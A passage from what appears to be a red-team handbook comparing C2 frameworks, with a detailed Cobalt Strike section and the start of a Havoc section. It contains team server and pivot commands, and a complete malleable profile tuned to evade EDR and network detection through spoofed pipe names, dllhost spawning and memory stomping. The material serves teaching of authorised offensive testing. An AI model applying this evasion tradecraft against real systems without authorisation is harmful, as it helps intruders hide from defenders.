Ask three things. Which egress protocols are supported natively? Can you carry traffic over something the framework does not know about, and how much work is that? And can implants relay for each other internally?

The floor is HTTP and HTTPS. Anything serious adds DNS (slow, loud, but sometimes the only thing that leaves), and a raw encrypted TCP transport for when you control both ends and do not care about looking like web traffic. Beyond that, the differentiators are pluggable transports, WebSocket support, HTTP/2 and HTTP/3 (Merlin's original claim to fame, and increasingly relevant because an HTTP/1.1-only client on a network where everything speaks HTTP/2 stands out), and a documented interface for bringing your own channel.

Peer-to-peer support is not optional for enterprise work. Servers in a segmented data centre VLAN with no internet route are extremely common, and the only way to work there is an internal relay.

#### Extensibility and the object file execution model

This is the axis that separates modern frameworks from the 2020 generation, and it is worth understanding the mechanism rather than the buzzword.

The old model is **fork and run**. To execute a post-exploitation capability, the implant spawns a sacrificial process, injects a DLL into it, runs the capability, collects output over a named pipe and lets the process exit. It is robust, because a crash kills the sacrifice and not the implant, and it is architecturally loud, because every single action produces a process creation, a cross-process memory allocation, a remote thread and a named pipe. On any EDR worth its licence that sequence is the detection.

The modern model is **in-process execution of a relocatable object file**. Cobalt Strike introduced **Beacon Object Files**, which are ordinary COFF object files (the unlinked output of a C compiler) that the implant loads itself: it parses the sections, allocates memory, applies the relocations, resolves imports either from loaded modules or from a small API the implant exports, and calls the entry point on the implant's own thread. Nothing is spawned, nothing is injected, no pipe is created. The trade-offs are that a BOF crash kills the implant, that BOFs are single-threaded and block the implant while running, that you get no C runtime so you must resolve everything dynamically, and that you are writing C.

BOFs became a de facto standard. Sliver, Havoc, AdaptixC2, several Mythic agents, and multiple commercial frameworks all load COFF objects using the same Beacon API surface, which means a large body of community tooling is portable across frameworks. When you evaluate a framework, "does it load BOFs" is a proxy for "can I reuse the ecosystem".

The second half of extensibility is the **scripting and command surface**. Cobalt Strike has Aggressor Script (a Sleep-language scripting engine that can define new commands, hook events and drive the UI). Sliver has the armory, a package manager for extensions and aliases. Mythic has the strongest story of all, because a "command" belongs to an agent's own container and adding one is a change to that agent's project rather than to the framework. Havoc has a Python scripting API. Covenant compiles new tasks from C# source with Roslyn at runtime, which was genuinely elegant in 2019.

#### Multi-operator support

A framework that cannot support several operators against one estate at once is a single-operator tool, and that is a fine thing to be, but know which you have. The real requirements are concurrent clients, per-operator identity so the log tells you who did what, shared visibility of implants and loot, and some way of avoiding two operators tasking the same implant simultaneously. Cobalt Strike, Sliver, Mythic, Havoc and HardHat all do this properly. Metasploit does not, in any usable sense.

Per-operator attribution is not a nice-to-have. It is what lets you answer a client's blue team when they ask whether a specific action at a specific minute was you.

#### Maturity of the post-exploitation tooling

The framework's built-in capability set is what you use on a normal day: credential material access, token manipulation, lateral movement helpers, a socks proxy and port forwarding, screenshots, keylogging, file browsing and transfer, process listing and injection, and in the Windows case some form of Kerberos ticket handling. The gap between the best and the worst here is enormous, and it is where Cobalt Strike's long lead shows most clearly, because a decade of Aggressor scripts and BOFs exists for it.

Weigh this against the engagement. If you are doing a fast internal assessment with no evasion requirement, a rich built-in toolkit is worth more than a great loader. If you are doing long-haul covert work, you will bring your own tooling anyway and you would rather have the loader.

#### Profile and indicator customisation

The question is: how much of what the target can observe can you change without touching the source code?

At the low end, a framework hardcodes its URIs, its user agent, its named pipe names and its response format, and your only options are recompiling or accepting the defaults. At the high end, a declarative profile controls the request paths, the HTTP verb per transaction, every header, where and how session metadata is encoded, how server responses are wrapped, the sleep and jitter, the process spawned for fork and run, the named pipe names, the memory allocation method for injection, whether the sleeping implant is encrypted, and the TLS certificate presented.

Cobalt Strike's malleable profile is the reference implementation of the high end and the reason the format is worth learning even if you use something else: it is the most complete public enumeration of the indicators a C2 framework produces.

#### Licence and cost

| Class | Examples | Practical notes |
| --- | --- | --- |
| Commercial, openly sold | Cobalt Strike | Per-user annual licence, low four figures upward. Purchasable by anyone who passes a basic check. |
| Commercial, vetted | Nighthawk, Brute Ratel C4, Outflank Security Tooling | Sold only after vetting the purchaser, deliberately restricted distribution to slow down criminal adoption and keep detections thin. Expect a real procurement conversation. |
| Open source, permissive | Sliver, Mythic, Havoc, Empire, AdaptixC2, Metasploit Framework | Free, auditable, modifiable. You own the evasion problem, and so does everybody else including the people writing detections. |
| Commercial, different market | SCYTHE, MITRE Caldera (open source but same market) | Adversary emulation and detection validation rather than covert operations. |

The unstated axis inside licensing is **distribution breadth**, and it correlates almost perfectly with detection coverage. A framework that anyone can download has been in every sandbox and every vendor's research pipeline. A vetted commercial product has not. This is the actual reason mature red teams pay for restricted tooling, and it is also why cracked builds of commercial frameworks are worse than useless: they are the exact binaries the vendors have signatured most heavily, they are often tampered with, and they get no updates.

#### How signatured the defaults are

Every framework ships defaults, and for every widely used framework those defaults are the single most detected artefact in the product. Default TLS certificates with recognisable subject fields, default named pipe names, default HTTP URIs, default user agents, default sacrificial processes, default sleep intervals, default JA3 and JARM fingerprints, default in-memory strings. All of it is published, and all of it is in commercial detection content.

Treat "how much of this can I change, and how much work is it" as a first-class selection criterion, and treat any out-of-the-box deployment of a public framework as a training exercise rather than an operation.

#### Putting the decision together

Four questions usually settle it.

**Is anyone looking?** If the engagement is a time-boxed internal assessment with a cooperative client and no detection objective, take the framework with the best built-in tooling and move fast. If the engagement is a covert operation against a monitored estate, take the framework with the best loader and profile control and accept that you will bring your own capability.

**What operating systems and what runtimes?** Windows-only against a modern estate points at C or C-plus-BOF. A mixed Linux, macOS and Windows estate points at Go or at Mythic with several agents. A hardened Windows estate with strong .NET telemetry argues against a .NET implant as your primary.

**What actually gets out of the network?** Determine this before you choose. An estate with a transparently inspecting proxy, no direct DNS egress and an application allowlist constrains you far more than the framework choice does.

**How many operators, for how long?** Multi-operator, multi-week operations need real logging, real deconfliction support, and infrastructure that can be rebuilt when part of it burns. Solo work for a fortnight does not.

### The current landscape

The source's list is a snapshot of the C2 Matrix era. That project, a community-maintained comparison spreadsheet at *thec2matrix.com*, was genuinely useful around 2020 and has not been maintained since roughly 2021, so treat any framework's row in it as historical. Several entries on the source's list are dead. Several important frameworks postdate it. This survey says plainly which is which, and where a project's current state is unclear, it says that instead of pretending.

#### Commercial

**Cobalt Strike** (Fortra, originally Strategic Cyber LLC). C implant (Beacon), Java team server and client. Per-user annual licence, openly sold subject to a basic check. Still the reference implementation and still, by a wide margin, the most capable general-purpose framework in terms of built-in tooling, ecosystem and profile control. It is also the most heavily detected: its ubiquity among both red teams and criminal groups means its defaults, its network patterns, its memory layout and its team server fingerprints are the best-covered detection content in the industry. Fully treated below.

**Nighthawk** (MDSec). C implant, commercial, sold only after vetting. Built from the ground up as an evasion-first framework rather than a general-purpose toolkit: extensive in-implant opsec controls, encrypted memory at rest, indirect syscall invocation, call stack manipulation, and a design philosophy of letting the operator decide the risk of every action rather than baking in behaviour. Deliberately restricted distribution keeps its detection surface thin. It was abused at least once by a criminal group after a build leaked, which prompted tighter controls. If your work is genuinely covert and your budget allows, this is the class of tool that class of work wants.

**Brute Ratel C4** (Dark Vortex). C implant (Badger), commercial, vetted. Arrived in 2020 and 2021, so it postdates the source's list in spirit if not in date. Strong evasion posture, a modern operator interface, BOF support, and multiple channel types including DNS over HTTPS and internal SMB and TCP pivots. Its notoriety comes from a 2022 leak of a cracked build which was then adopted enthusiastically by ransomware crews, after which detection coverage improved sharply and the author restricted licensing further. Still commercially available and still capable, but the leak permanently cost it some of the thin-detection advantage that is the point of a vetted product.

**Outflank Security Tooling** (Outflank). A vetted commercial toolkit that includes a C2 component alongside payload generation and other offensive tooling. Same market position as Nighthawk: restricted distribution, evasion focus, aimed at mature teams. Availability is by procurement conversation, not download.

**SCYTHE**. Commercial, and a different category. An adversary emulation platform built for running repeatable, measurable threat emulation campaigns so a defensive team can validate detection coverage. It has an agent and it does tasking, so it is technically a C2, but it is designed to be observed rather than to hide. Excellent for purple team work and detection validation, wrong tool for a covert operation. Still an active commercial product.

#### Open source, actively maintained

**Sliver** (Bishop Fox). Go implants, Go server, terminal client, mTLS and WireGuard and HTTPS and DNS transports, an armory package manager, BOF support via a COFF loader, proper multiplayer. The default open source choice for most teams and the most sensible starting point if you are learning modern C2, because it is well documented and its concepts map cleanly onto everything else. Covered in depth earlier in this section. Its weaknesses are the Go ones: implant size, runtime footprint, and a TLS fingerprint that is unmistakably Go unless you do something about it.

**Mythic** (SpecterOps, Cody Thomas). A framework whose architecture is genuinely different: the core is a set of Docker containers and knows nothing about any specific agent or transport. Agents and C2 profiles are independent projects installed into it. Full treatment below. If you need multiple implant technologies across multiple operating systems under one console, or you intend to write your own agent, this is the correct answer.

**Havoc** (C5pider). Go teamserver, C++ and Qt client, C and assembly implant (Demon) with modern evasion features built in. Full treatment below, including an honest note on its current activity level.

**Empire** (originally Veris Group, now maintained by BC Security as Empire 4 and later). The original PowerShell Empire was abandoned in 2019; BC Security picked it up, modernised it substantially, and added C#, Python and IronPython agents, a plugin system, malleable-style profile support and the Starkiller web interface. It is actively maintained, which is more than can be said for most of its generation. Its heritage is still visible: it is strongest at the PowerShell-era workflow and its post-exploitation module set is largely inherited. Good for training, CTF and assessment work; the PowerShell agent in particular is not a covert option against instrumented Windows.

**Metasploit Framework** (Rapid7). Meterpreter in C, with Java, Python and PHP variants. Not a red team C2 and should not be used as one: no beaconing model worth the name, no traffic shaping, no multi-operator story, and the most comprehensively signatured payload set in existence. It remains indispensable for exploitation, for its auxiliary and post module libraries, for its payload generation, and for lab and training work. Keep it, use it for what it is good at, and do not put Meterpreter on a monitored network expecting to survive.

**PoshC2** (originally Nettitude, now under LRQA). Python 3 server with PowerShell, C# and Python implants, daisy-chaining support, a good built-in module set and configurable URLs and user agents. It has been through several substantial rewrites and has a loyal user base among UK consultancies. Release cadence has slowed considerably; check the repository's recent activity before committing to it for a long engagement.

**Merlin** (Ne0nd0g). Go implant and server. Its distinguishing feature has always been transport research: HTTP/1.1, HTTP/2 and HTTP/3 over QUIC, which no other framework offered at the time and which matters more now that HTTP/2 is the norm on the wire. Later versions added peer-to-peer linking. It is also available as a Mythic agent, which is arguably the best way to use it. Realistically a one-maintainer research project rather than a team platform, and worth knowing for the transport work.

**HardHat** (DragoQCC). C# ASP.NET Core team server, Blazor web client, C# implants ("Engineers"), multi-user with role separation. A newer entrant that fills the gap Covenant left: a modern, actively developed, .NET-native framework with a web UI. Smaller ecosystem than the established options and the same fundamental .NET telemetry exposure any CLR-based implant has. Worth watching and reasonable for .NET-centric work; confirm current activity before relying on it.

**AdaptixC2**. A recent open source framework, Go server with a C++ and Qt GUI client and C beacons, deliberately modelled on the Cobalt Strike operator experience, with BOF support and an extension mechanism. It gained attention rapidly in 2025, including reports of adoption by criminal groups, which is both a compliment to its capability and a guarantee that detection coverage is arriving fast. Young and moving quickly, so expect breaking changes; genuinely interesting as a free alternative with a Cobalt-Strike-shaped workflow.

**NimPlant** (Cas van Cooten). Python server, Nim implant. Small, lightweight, deliberately minimal, well suited as a first-stage or as a lightweight secondary channel rather than as a primary platform. Nim's relative obscurity buys some detection headroom; do not mistake obscurity for evasion.

#### Dead, dormant or superseded

Being honest here is more useful than neutral coverage. Deploying an unmaintained framework means no fixes, no adaptation to new Windows behaviour, and detection content that has had years to mature against a static target.

**Covenant** (cobbr). Archived by its author and no longer maintained. It was an important and genuinely innovative project, and its .NET Framework Grunts are now among the most reliably detected implants available. Full treatment below because the source demands it and because its design is instructive, but the honest recommendation is HardHat, Mythic with Apollo, or Empire's C# agent instead.

**SILENTTRINITY** (byt3bl33d3r). The "bring your own interpreter" idea, embedding IronPython, Boo and other DLR languages in a .NET implant so that payload logic never exists as compiled IL on disk, was one of the best ideas of its era and is still worth understanding. The project itself has had no meaningful development for years and its author moved on to other work. Read it for the concept, do not operate it.

**SharpC2** (Rasta Mouse). A clean, well-written C# framework that has been effectively dormant for a long time. Verify the repository state yourself before dismissing it entirely, but do not plan an engagement around it.

**Voodoo**. Listed in the C2 Matrix era and never achieved meaningful adoption. I am not aware of any current activity or of a user community, and I would not rely on this description being complete. Treat it as dead unless you have specific reason to think otherwise.

**PowerShell Empire (original)**, **Koadic**, **Pupy**, **Faction**, **Shad0w** and the rest of the 2017 to 2020 cohort. Abandoned. Their techniques live on in the modern frameworks; their code does not need to.

#### Adversary emulation platforms

**MITRE Caldera**. Open source, Go agent (Sandcat) plus others, with an emphasis on automated execution of ATT&CK-mapped adversary behaviour. Like SCYTHE, this is a detection-validation tool: it exists to be caught and measured. Extremely useful for purple team engagements and for generating telemetry to test detection content, and it is the wrong shape for covert work.

#### Frameworks you will meet on the other side

Worth recognising by name, because they turn up in incident response and in threat intelligence, and because your client may ask you to emulate one. **Manjusaka** and **Viper** and **Supershell** are Chinese-developed Cobalt-Strike-inspired frameworks seen in real intrusions; **Godzilla**, **Behinder** and **AntSword** are webshell management platforms rather than general C2 but perform the same function for web-facing footholds. Cracked Cobalt Strike and cracked Brute Ratel remain extremely common in criminal operations, which is precisely why the legitimate versions attract so much detection engineering effort.

#### Third-party channel frameworks

Not C2 frameworks in their own right but worth knowing as an infrastructure pattern: tooling that carries another framework's frames over a legitimate third-party service such as a chat platform, a cloud storage provider, a source code host or an internal database. WithSecure Labs' **C3** is the best-known public implementation of the idea, hooking into Cobalt Strike's External C2 interface among others; its activity level is now low. The concept matters more than any specific implementation, because a callback to a service the target already uses and already allows defeats destination reputation and categorisation entirely. The cost is throughput, rate limits, and the fact that your account on that service is a single point of failure that the provider can terminate without warning.

### Cobalt Strike

Cobalt Strike is the reference point for everything else in this section, so it is worth understanding properly even if you never license it. Its profile format is the most complete public catalogue of C2 indicators; its listener taxonomy is the vocabulary everyone else borrowed; its BOF interface became a cross-framework standard; and its defaults are the most heavily detected artefacts in offensive tooling. The source reduces all of this to a list of listener names with two cryptic notes, so the aim here is to explain the model and then decode those notes.

#### Team server and client

The team server is a Java process started on the infrastructure host. It takes a bind address, a shared password used by operator clients, a malleable profile, and optionally a kill date.

```bash
# On the team server host, inside the Cobalt Strike directory
./teamserver $ATTACKER '<teamserver-password>' /opt/profiles/operation.profile
```

It listens on TCP 50050 for operator clients. That port must never be exposed. The correct pattern is a firewall that denies everything except your listener ports and SSH, plus an SSH local forward from each operator's machine:

```bash
ssh -N -L 50050:127.0.0.1:50050 ops@$ATTACKER
# then point the client at 127.0.0.1:50050
```

The client is also Java, launched with `./cobaltstrike` or the platform launcher. Multiple operators connect to one team server, see the same targets and sessions, and share an event log. Operator names are chosen at connect time and appear in the logs, which is the mechanism you rely on for attribution.

The team server writes structured logs under a *logs* directory, one subdirectory per day, containing a per-Beacon transcript of every command and its output, plus the collected screenshots, keystrokes and downloads. Do not delete these. They are your deconfliction evidence and half your report.

#### Beacon and its check-in behaviour

**Beacon** is the implant: position-independent C, with x86 and x64 variants, delivered either as a full stageless payload or by a small stager that fetches the rest.

The check-in loop for the HTTP and HTTPS variants is worth spelling out because everything about malleable profiles follows from it. Beacon sleeps for its configured interval, adjusted by a random jitter percentage. On waking it issues an HTTP request to the *http-get* transaction's URI, carrying its **session metadata** encoded and placed exactly where the profile says. The team server matches the metadata to a session and replies with any queued tasks, encrypted and wrapped in whatever the profile's server block specifies. Beacon decrypts, executes, and sends output back via the *http-post* transaction, which carries the session identifier and the output data. If there is no output, and no tasks are queued, the exchange is an empty poll.

The first check-in is a registration. Beacon generates a symmetric key pair (an AES key and an HMAC key), encrypts them with the team server's RSA public key, which is embedded in the payload, and sends them along with the host metadata: computer name, user name, process name, process ID, internal IP address, architecture flag, OS version and code page. That metadata blob is what populates your session table, and its structure is exactly what config-extraction tooling looks for.

Sleep and jitter are set per session and are the single most consequential opsec control you have:

```text
sleep 3600 37     # one hour interval, 37 percent jitter
sleep 5 20        # short-haul working interval
sleep 0           # interactive; a continuous connection, use briefly and deliberately
```

The defaults, a sixty second interval and zero jitter, produce a perfectly periodic beacon and are the textbook example used in every network detection training course.

#### Staging, and why you turn it off

A **stager** is a few hundred bytes of shellcode whose only job is to retrieve the real payload over the C2 channel and execute it. It exists for delivery vectors with a hard size limit.

The problem is the server side. To serve stages, the team server must answer unauthenticated requests for payloads. Cobalt Strike's HTTP stager requests use a URI whose four characters satisfy a checksum: the byte values sum to 92 for the x86 stage and 93 for the x64 stage. That algorithm is public, which means anyone who finds your listener, including internet-wide scanners, can request your payload, extract the embedded configuration, and publish it. This is the primary mechanism by which Beacon configurations get harvested at scale.

Turn it off in the profile and use stageless payloads unless a specific delivery constraint forces your hand:

```text
set host_stage "false";
```

#### Egress listeners

| Listener | Payload identifier | Transport | Notes |
| --- | --- | --- | --- |
| Beacon HTTP | `windows/beacon_http/reverse_http` | HTTP | Cleartext on the wire, so a TLS-inspecting proxy is irrelevant but everything is visible. Rarely the right choice. |
| Beacon HTTPS | `windows/beacon_https/reverse_https` | HTTPS | The default choice. Uses WinINet by default, so it inherits system proxy settings and can authenticate to a proxy as the current user. |
| Beacon DNS | `windows/beacon_dns/reverse_dns_txt` | DNS | Very low bandwidth, survives environments with no other egress, extremely detectable by any DNS security product. Long-haul only. |

The HTTPS Beacon's use of WinINet matters more than it sounds. Because the request goes through the same stack Internet Explorer and much of Windows uses, it picks up WPAD and PAC-discovered proxies, honours proxy exclusion lists, and performs proxy authentication with the token of the user the Beacon is running as. On an estate where nothing reaches the internet except through an authenticating proxy, that is the difference between a callback and silence. It also means Beacon's TLS is Schannel's TLS, which is a considerable advantage: the JA3 and JA4 fingerprint matches what the operating system's own components produce rather than announcing a bespoke TLS library.

#### Peer-to-peer listeners

| Listener | Payload identifier | Transport | Direction |
| --- | --- | --- | --- |
| Beacon SMB | `windows/beacon_bind_pipe` | Named pipe over SMB | Child binds a pipe, parent connects to it |
| Beacon TCP (bind) | `windows/beacon_bind_tcp` | Raw TCP | Child listens, parent connects |
| Beacon TCP (reverse) | `windows/beacon_reverse_tcp` | Raw TCP | Child connects out to the parent |

These have no egress path of their own. Their traffic is relayed by a parent Beacon over the parent's egress channel, so they are how you work on hosts with no internet route and how you avoid one external callback per compromised host.

You attach them from a parent Beacon:

```text
link \\$TARGET\pipe\<pipename>      # attach to an SMB Beacon
connect $TARGET <port>              # attach to a bind TCP Beacon
unlink \\$TARGET\pipe\<pipename>    # detach without killing the child
```

Named pipes over SMB are the workhorse and they are also where the source's second note comes from. Cobalt Strike's historical default pipe name pattern, and the separate pipe names used for post-exploitation jobs, are known strings. Sysmon events 17 and 18 record named pipe creation and connection, and every EDR product ships detection content for the default patterns. Change them in the profile:

```text
set pipename        "mojo.5688.8052.183894939787088877##";
set pipename_stager "mojo.5688.8052.35780273329370473##";

post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0,mojo.5688.8052.####";
}
```

The `#` characters are replaced with random hexadecimal at generation time. The names above imitate real Chromium and Windows socket catalogue pipes, which is the correct approach: a pipe name should look like something that already exists on that host. A random GUID-shaped name is better than the default but is itself anomalous, because real software rarely creates pipes with no recognisable prefix. Note that *pipename* covers the SMB Beacon's own listener while the *post-ex* block's *pipename* covers the pipes used to collect output from spawned post-exploitation jobs; they are separate settings and defenders detect both.

The other cost of SMB Beacons is topological. Workstation-to-workstation SMB on port 445 is unusual in most estates, and a pipe connection from a user's laptop to a colleague's laptop is a strong signal. Server-to-server and workstation-to-server are far more normal. Choose your parent accordingly.

#### External C2 and foreign listeners

**External C2** is a documented specification, not a transport. You start an External C2 listener on the team server, and you then write your own controller: a program that speaks the External C2 protocol to the team server on one side, and moves the resulting opaque frames over any channel you like on the other. That is how a Beacon ends up talking over a chat platform, a cloud storage API, an internal database table, or a serial link. The framework never needs to know what the channel is. The team server side listens on a dedicated port for these connections, which like 50050 must not be internet-facing.

**Foreign listeners** are an interoperability feature. A foreign HTTP or HTTPS listener describes a Metasploit HTTP or HTTPS handler, and lets you pass a session from Cobalt Strike into Metasploit by spawning a Metasploit stager from a Beacon. The constraints are that this works with Metasploit's staged HTTP and HTTPS payloads and that the address, port and URI must match the handler exactly. It is useful when someone on the team needs a Meterpreter for a specific post module, and it inherits all of Meterpreter's detectability.

#### Decoding the source's listener notes

The source presents three groups, "Beacons", "External" and "Foreign", with two notes. Translated:

Its **Beacons** group is the union of the egress listeners (DNS, HTTP, HTTPS) and the peer-to-peer listeners (SMB, TCP). The distinction it fails to draw is exactly the one that matters: three of those five reach your infrastructure and two of them do not leave the target network.

Its **External: TCP, C2** entry is the muddled one. "C2" is the External C2 interface described above. "TCP" almost certainly refers to the bind variant of the TCP Beacon, which listens on the target rather than calling back, and which the Cobalt Strike interface groups separately from the reverse variant. Read it as "the payloads that wait to be connected to, plus the bring-your-own-channel interface".

Its **DNS note**, "make sure to fill BOTH the DNS HOST and (Stager) with the HOSTNAME", refers to two separate fields in the DNS listener dialog. The **DNS Hosts** field holds one or more hostnames whose NS records delegate to your team server or DNS redirector; that is what Beacon uses for C2. The **DNS Host (Stager)** field holds the hostname used by the DNS TXT record stager to fetch the stage. If you fill the first and leave the second empty, C2 works but staged DNS payloads fail with no useful error, which is a genuinely confusing afternoon. The note is correct as far as it goes, and the better answer is to go stageless, at which point the stager field is irrelevant.

Its **SMB note**, "change the pipeline (C2) to something less fingerprinted", means the *pipename* settings above. The reason, which the source omits, is that the defaults are published strings in every vendor's detection content.

#### Malleable C2 profiles

The malleable profile is the central customisation mechanism and the reason Cobalt Strike remained viable long after its defaults were burned. It is a declarative document, loaded by the team server at startup, that controls both network and host indicators. Changing it requires a team server restart and invalidates existing payloads, so it is a decision you make before the operation, not during it.

What a profile controls, grouped by what it affects:

| Area | Block or option | Controls |
| --- | --- | --- |
| Timing | `sleeptime`, `jitter`, `data_jitter` | Check-in interval, randomisation, random padding on server responses to break fixed-size detection |
| Identity on the wire | `useragent`, `http-get`, `http-post`, `http-stager` | Request URIs, verb, every client and server header, and where session metadata and output are encoded |
| Encoding | `metadata`, `id`, `output` transform blocks | Chained transforms (`base64`, `base64url`, `netbios`, `mask`, `prepend`, `append`) and the terminating placement (`header`, `parameter`, `uri-append`, `print`) |
| TLS | `https-certificate` | The certificate and keystore presented by an HTTPS listener |
| Code signing | `code-signer` | Signing of generated executables and DLLs |
| DNS behaviour | `dns-beacon` | Subdomain prefixes per message type, `maxdns`, `dns_idle`, `dns_sleep`, response behaviour |
| Post-exploitation host indicators | `post-ex` | `spawnto_x86` and `spawnto_x64`, output pipe names, AMSI handling, output obfuscation, keylogger method |
| Injection behaviour | `process-inject` | Allocation method, minimum allocation size, whether memory is ever RWX, shellcode transforms, and the thread creation primitive |
| Loader and in-memory shape | `stage` | Whether the loaded image is RWX, whether the loader cleans up its headers, sleep masking, PE header stomping, module stomping target |
| P2P framing | `pipename`, `pipename_stager`, `smb_frame_header`, `tcp_frame_header`, `tcp_port`, `ssh_banner` | Named pipe names, framing bytes prepended to P2P messages, ports and banners |
| Miscellaneous | `host_stage`, `tasks_max_size`, `steal_token_access_mask` | Staging on or off, task size ceiling, token duplication access mask |

A minimal but realistic fragment, to make the shape concrete:

```text
set sleeptime   "45000";
set jitter      "37";
set data_jitter "100";
set useragent   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
set host_stage  "false";

http-get {
    set uri "/api/v2/session/status";
    client {
        header "Accept"          "application/json, text/plain, */*";
        header "Accept-Language" "en-GB,en;q=0.9";
        metadata {
            base64url;
            prepend "sid=";
            header "Cookie";
        }
    }
    server {
        header "Content-Type"  "application/json; charset=utf-8";
        header "Cache-Control" "no-store";
        output {
            base64;
            prepend "{\"status\":\"ok\",\"payload\":\"";
            append  "\"}";
            print;
        }
    }
}

post-ex {
    set spawnto_x64 "%windir%\\system32\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set obfuscate   "true";
    set smartinject "true";
}

process-inject {
    set allocator "NtMapViewOfSection";
    set userwx    "false";
    set startrwx  "false";
}

stage {
    set userwx    "false";
    set cleanup   "true";
    set obfuscate "true";
    set stomppe   "true";
}
```

Three things to note about the structure. The **client metadata block** is a chain of transforms terminated by a placement statement, and the server must be able to reverse it, so the chain is symmetric by construction. The **server output block** is terminated by `print`, which is the only valid terminator there. And the transforms are not encryption: the payload is already encrypted, and the transforms exist purely to make the bytes look like something plausible in the position they occupy.

Always lint before you deploy. The linter checks the profile is parseable and that the transforms round-trip:

```bash
./c2lint /opt/profiles/operation.profile
```

The critical rule about profiles: **do not use a public one unmodified**. Every profile in every popular GitHub repository has been signatured, because a defender can extract the URIs, headers and transform chains from those repositories just as easily as you can clone them. Public profiles are templates to learn from, and generators such as *C2concealer*, *SourcePoint* and *random_c2_profile* produce randomised profiles, which solves the "identical to a known public profile" problem but not the "looks like generic randomness rather than like the target's real traffic" problem. The best profile is one you built by capturing a real transaction from an application the target genuinely uses and reproducing it.

#### The kit and object file extensibility model

Cobalt Strike's extensibility comes in two flavours, and the distinction between them is the difference between changing behaviour and adding capability.

**Kits** replace parts of Beacon's own machinery, distributed as source you compile yourself. The set has grown over the years and includes the Artifact Kit (the executable and DLL templates, and their loader shellcode), the Resource Kit (the script templates for PowerShell, VBA, HTA and similar), the Sleep Mask Kit (the routine that encrypts Beacon in memory while it sleeps), the Process Injection Kit (the allocation and execution primitives used for injection), the User Defined Reflective Loader (your own loader in place of the stock one), the Post-Ex Kit (the post-exploitation DLLs), the Mimikatz Kit and the Elevate Kit. The point of every one of them is the same: the default is signatured, and the kit is how you stop shipping the default. A team that licences Cobalt Strike and does not compile its own kits has bought a very expensive way to get caught.

**Beacon Object Files** add capability. A BOF is a COFF object file, the direct output of `cl.exe` or `x86_64-w64-mingw32-gcc` with no linking, which Beacon loads itself. Beacon parses the section table, allocates memory, applies relocations, resolves symbols, and calls the entry point on its own thread:

```text
inline-execute /path/to/whoami.o
```

Symbol resolution is where the interface lives. A BOF calls Windows APIs through specially named external symbols of the form `LIBRARY$Function`, for example `KERNEL32$GetCurrentProcessId`, which Beacon resolves at load time. It returns output and parses arguments through a small API that Beacon exports: `BeaconPrintf` and `BeaconOutput` for output, `BeaconDataParse`, `BeaconDataInt` and `BeaconDataExtract` for unpacking the packed argument buffer, and helpers for token and injection operations. Aggressor Script packs the arguments on the operator side.

The constraints are the important part:

- **No C runtime.** No `printf`, no `malloc` unless you resolve it, no static initialisers. Everything comes from an API you resolve explicitly.
- **Single-threaded and blocking.** The BOF runs on Beacon's thread. While it runs, Beacon does nothing else, including checking in.
- **A crash is fatal.** There is no sacrificial process to absorb an access violation. A null dereference in a BOF loses the session.
- **Position independence matters.** Global writable data works, but you are responsible for not assuming a base address.

In exchange, you get an action with no process creation, no cross-process allocation, no remote thread and no output pipe, which removes the entire fork-and-run detection chain. This is why the ecosystem moved to BOFs and why "loads COFF objects" is now a baseline expectation across frameworks.

**Aggressor Script** is the third piece: a scripting engine using the Sleep language that runs in the operator client. It registers new Beacon commands and aliases, hooks events, packs BOF arguments, adds menu items and popup entries, and reacts to session events. It is how a BOF becomes a first-class command rather than a file path you have to remember, and it is how teams automate their own workflow.

#### Why the defaults are the worst defaults available

This deserves stating without hedging. Cobalt Strike is used by a very large fraction of professional red teams and by a very large fraction of criminal intrusion sets. That combination has produced more detection engineering effort against Beacon than against any other implant in existence. Concretely, in a default deployment:

- The self-signed certificate shipped with the product has a well-known subject and a well-known hash, and detection rules match on it directly.
- The team server's TLS stack produces a JARM fingerprint that internet-wide scanners tag automatically, so a default team server is findable without any knowledge of your operation. Do not commit a specific JARM value to memory or to a report: the fingerprint is a property of the *Java* TLS stack the team server runs on, not of Cobalt Strike itself, so it shifts whenever the JDK's default protocol or cipher set changes. The widely circulated value from before April 2021 stopped being correct the moment Java disabled TLS 1.0 and 1.1 by default, and it was never Cobalt-Strike-specific: any Java service on the same JDK produced it. Fingerprint your own team server against a current JARM implementation and compare, rather than trusting a published constant. JARM is also trivially spoofable by fronting the listener, which is the actual fix.
- The default malleable behaviour, including default URIs and the default user agent, matches published network signatures.
- Default named pipe names for both SMB Beacons and post-exploitation jobs are in every EDR's rule set.
- The default `spawnto` is a *rundll32.exe* with no command line arguments, which is a canonical fork-and-run indicator.
- Beacon's in-memory configuration is stored as a structure obfuscated with a single-byte XOR, historically `0x2e` in version 3 and `0x69` in version 4, and public tooling extracts it from a memory dump or a payload file in one command.
- Staging enabled means anyone can fetch your payload and extract that configuration remotely.

None of that is an argument against the tool. It is an argument that the tool assumes you will do work: a custom profile built from observed target traffic, compiled kits, a user-defined reflective loader, a sleep mask, staging disabled, a real certificate on a categorised domain, and infrastructure that does not answer scanners. Cobalt Strike used competently is still extremely effective. Cobalt Strike used out of the box is a detection demo.

### Havoc

**What it is.** An open source, Cobalt-Strike-shaped framework by C5pider, notable for shipping modern evasion techniques as first-class, configurable features rather than as bolt-ons. It is the project that demonstrated a free framework could compete with commercial products on implant quality.

**Architecture.** Three pieces. The **teamserver** is written in Go and owns state, listeners and the operator API. The **client** is C++ with Qt, a native GUI with a session table, a graph view and a per-session console, connecting to the teamserver over a websocket. The implant is **Demon**, written in C with hand-written assembly, x64 only.

The teamserver is configured by a profile file in **YAOTL** syntax, an HCL-like configuration language, which defines the operators, the listeners, the demon defaults and the service endpoints. That single file is the equivalent of Cobalt Strike's malleable profile plus its user configuration, and it is where you set sleep, jitter, the HTTP request shape, headers, user agent, URIs and the injection behaviour.

```bash
# Build and run, from the repository root
make ts-build
make client-build
./havoc server --profile ./profiles/operation.yaotl -v --debug
./havoc client
```

